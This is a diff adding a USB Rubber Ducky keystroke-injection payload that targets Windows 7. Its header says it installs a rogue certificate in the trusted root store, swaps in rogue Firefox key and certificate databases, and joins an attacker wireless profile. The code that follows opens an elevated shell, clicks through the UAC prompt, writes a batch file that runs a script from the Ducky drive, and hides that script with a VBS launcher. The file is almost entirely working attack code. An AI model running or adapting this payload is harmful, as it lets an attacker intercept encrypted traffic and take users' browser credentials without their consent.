@@ -1,0 +1,63 @@
+REM Author: jdorrough
+REM
+REM Description:Payload mounts and assigns drive letter to twin duck flash storage,
+REM		copies a certificate, adds cert to trusted root store, copies a 
+REM		rouge Firefox key3db and cert8db to users profile, creates a new
+REM		wireless profile, connects to wireless profile
+REM
+REM Testcase: This payload tested using duck_v2.1.hex attacking Windows 7 Professional 
+REM
+DELAY 10000
+GUI r
+DELAY 200
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 750
+ALT y
+DELAY 300
+ENTER
+STRING cd %USERPROFILE%
+ENTER
+REM *************Uses code from overwraith's "Payload runexe from sd"***************
+ENTER
+STRING erase /Q DuckyWait.bat
+ENTER
+STRING copy con DuckyWait.bat
+ENTER
+STRING :while1
+ENTER
+REM *************if admin, use the following for loop instead***********************
+REM *************Uses code from googleknowsbest*************************************
+REM ****STRING for /f "tokens=3 delims= " %%A in ('echo list volume ^| diskpart ^| findstr "DUCKY"') do (set DUCKYdrive=%%A:)
+STRING for /f %%A in ('wmic volume get driveletter^, label ^| findstr "DUCKY"') do (set DUCKYdrive=%%A)
+ENTER
+STRING if Exist %DUCKYdrive% (
+ENTER
+STRING goto :break
+ENTER
+STRING )
+ENTER
+STRING timeout /t 30
+ENTER
+STRING goto :while1
+ENTER
+STRING :break
+ENTER
+STRING set DUCKYdrive=%DUCKYdrive%\ca
+ENTER
+REM ******************Uses code from overwraith's "DuckSlurp"********************
+STRING %DUCKYdrive%\trusted-cert.bat
+CONTROL z
+ENTER
+STRING erase /Q invis.vbs
+ENTER
+STRING copy con invis.vbs
+ENTER
+STRING CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
+ENTER
+CONTROL z
+ENTER
+STRING wscript.exe invis.vbs DuckyWait.bat
+ENTER
+STRING cls
+ENTER
